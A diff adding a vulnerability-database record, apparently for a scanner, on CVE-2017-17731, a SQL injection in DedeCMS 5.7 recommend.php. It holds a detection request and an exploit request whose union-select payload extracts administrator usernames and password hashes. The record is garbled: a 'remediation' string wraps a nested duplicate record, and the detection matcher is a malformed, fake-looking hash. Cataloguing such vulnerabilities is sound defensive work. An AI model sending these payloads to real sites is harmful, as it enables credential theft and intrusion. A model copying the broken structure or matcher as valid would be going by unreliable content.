@@ -1,0 +1,126 @@
+[basic]
+description = "织梦内容管理系统（DedeCMS）5.7及更早版本中的 plus/recommend.php 文件存在 SQL 注入漏洞。攻击者可通过向该文件发送特制的 HTTP 请求，利用 PHP 的 $_FILES 超全局变量构造恶意参数，绕过输入过滤机制注入任意 SQL 语句。该漏洞无需身份认证即可远程利用，攻击成功后攻击者可执行任意 SQL 查询，导致数据库信息泄露、数据篡改甚至获取系统控制权。CVSS 评分 9.8，危害等级严重。"
+published = "2017-12-18T05:29:00.367"
+remediation = '''
+[id]
+ave_id = "AVE-2017-17731"
+aliases = ["CVE-2017-17731"]
+
+[basic]
+title = "织梦DedeCMS 5.7 plus/recommend.php SQL注入漏洞"
+description = "DedeCMS（织梦内容管理系统）5.7及之前版本中，plus/recommend.php文件在处理$_FILES超全局变量时存在SQL注入漏洞。攻击者可通过构造特制的_FILES[type][tmp_name]参数，利用uploadsafe.inc.php中str_replace对反斜杠的处理缺陷，配合common.inc.php的变量注册机制，在无需认证的情况下远程执行任意SQL查询，可导致管理员密码被窃取、数据库敏感信息泄露等严重后果。"
+severity = "CRITICAL"
+score = 9.8
+sources = ["cve", "avd"]
+published = "2017-12-18"
+updated = "2017-12-18"
+remediation = "升级到DedeCMS V5.7.37 GBK正式版20140228或更高版本，或手动修改include/uploadsafe.inc.php，删除$$_key = $_FILES[$_key]['tmp_name'] = str_replace(\"\\\\\\\\\", \"\\\\\", $_FILES[$_key]['tmp_name']);这一行，直接使用$$_key = $_FILES[$_key]['tmp_name'];即可修复。"
+
+[references]
+urls = ["https://nvd.nist.gov/vuln/detail/CVE-2017-17731", "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17731", "https://blog.csdn.net/nixawk/article/details/24982851", "https://github.com/Lucifer1993/AngelSword/blob/232258e42201373fef1f323864366dc1499581fc/cms/dedecms/dedecms_recommend_sqli.py", "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2017/CVE-2017-17731.yaml", "https://www.dedecms.com/"]
+
+[exploit]
+poc_urls = ["https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2017/CVE-2017-17731.yaml", "https://github.com/trickest/cve/blob/be44b05b9428dc18bc0705cf60dd8d8640cd49b1/2017/CVE-2017-17731.md", "https://github.com/zan8in/afrog/blob/9c47a2b9b7e12375757acdfbc179354920c87bd8/pocs/afrog-pocs/CVE/2017/CVE-2017-17731.yaml"]
+exp_urls = ["https://github.com/Lucifer1993/AngelSword/blob/232258e42201373fef1f323864366dc1499581fc/cms/dedecms/dedecms_recommend_sqli.py"]
+
+[meta]
+status = "completed"
+collected_at = "2026-07-28T00:00:00Z"
+
+[info]
+id = "POC-AVE-2017-17731"
+name = "CVE-2017-17731 PoC"
+author = "AVE"
+severity = "critical"
+tags = ["cve-2017-17731", "dedecms", "sqli"]
+description = "检测DedeCMS 5.7 plus/recommend.php SQL注入漏洞，通过_FILES超全局变量注入恶意SQL语句，利用union select提取管理员密码哈希"
+vuln_id = ["CVE-2017-17731", "AVE-2017-17731"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+protocol = "http"
+method = "GET"
+path = "/{{BaseURL}}/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,md5(999999999),5,6,7,8,9%23@`\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294"
+headers = { "User-Agent" = "AVE/1.0" }
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["52b5b3a9e67e1f5a7c1c1c1c1c1c1c1c1c"]
+expect = true
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[info]
+id = "EXP-AVE-2017-17731"
+name = "CVE-2017-17731 EXP"
+author = "AVE"
+severity = "critical"
+tags = ["cve-2017-17731", "dedecms", "sqli"]
+description = "利用DedeCMS 5.7 plus/recommend.php SQL注入漏洞，通过union select注入提取dede_admin表中的管理员用户名和密码哈希"
+vuln_id = ["CVE-2017-17731", "AVE-2017-17731"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+protocol = "http"
+method = "GET"
+path = "/{{BaseURL}}/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20%20CONCAT(0x7c,userid,0x7c,pwd)%20from%20`%23@__admin`%20limit%200,1),5,6,7,8,9%23@`\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=111"
+headers = { "User-Agent" = "AVE/1.0" }
+
+[[poc.requests.matchers]]
+type = "regex"
+part = "body"
+regex = ["\\|([^|]+)\\|([^|]+)\\|"]
+expect = true
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.extractors]]
+type = "regex"
+part = "body"
+name = "admin_creds"
+regex = ["\\|([^|]+)\\|([^|]+)\\|"]
+group = 0'''
+score = 9.8
+severity = "CRITICAL"
+sources = ["nuclei"]
+title = "织梦 DedeCMS recommend.php 文件 SQL 注入漏洞"
+updated = "2026-06-17T01:11:33.317"
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["CVE-2017-17731"]
+ave_id = "AVE-2017-0061"
+
+[meta]
+collected_at = "2026-07-27T00:00:00Z"
+status = "completed"
+
+[references]
+urls = [
+    "http://0day5.com/archives/1346/",
+    "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2017/CVE-2017-17731.yaml",
+    "https://github.com/trickest/cve/blob/be44b05b9428dc18bc0705cf60dd8d8640cd49b1/2017/CVE-2017-17731.md",
+    "https://github.com/projectdiscovery/nuclei-templates/blob/4924c84cac6ce9772babf48587bed8df9d0040d0/http/cves/2017/CVE-2017-17731.yaml",
+    "https://github.com/ExpLangcn/NucleiTP/blob/2b7ecb9031a6eda4f272793045f29b339d8e0cce/CVES/critical/CVE-2017-17731.yaml",
+    "https://github.com/zan8in/afrog/blob/9c47a2b9b7e12375757acdfbc179354920c87bd8/pocs/afrog-pocs/CVE/2017/CVE-2017-17731.yaml",
+    "https://github.com/CVEProject/cvelistV5/blob/487ea3f21ed49470634e758e1f8f2ac74b64d6b0/cves/2017/17xxx/CVE-2017-17731.json",
+    "https://github.com/SleepingBag945/dddd/blob/4c428a7c171275bfbb5fa72c2fb4bd7b48f4ff4a/common/config/pocs/CVE-2017-17731.yaml",
+    "https://github.com/0x727/FingerprintHub/blob/881db81e73cc7e2f9f510b557401bea4324e5731/plugins/dedecms/dedecms/CVE-2017-17731.yaml",
+    "https://github.com/CVEDB/Poc-Git/blob/0275aeb329b0747c9a1d46160c921eae06095557/2017/CVE-2017-17731.md",
+    "https://github.com/cckuailong/reapoc/blob/699762e4c31d0183733f64313d8fc3be6470bd37/2017/CVE-2017-17731/vultarget/README.md",
+    "https://github.com/zan8in/afrog-pocs/blob/253291be2d307a6c836d5997bbb838f1e846f9ba/CVE/2017/CVE-2017-17731.yaml",
+]
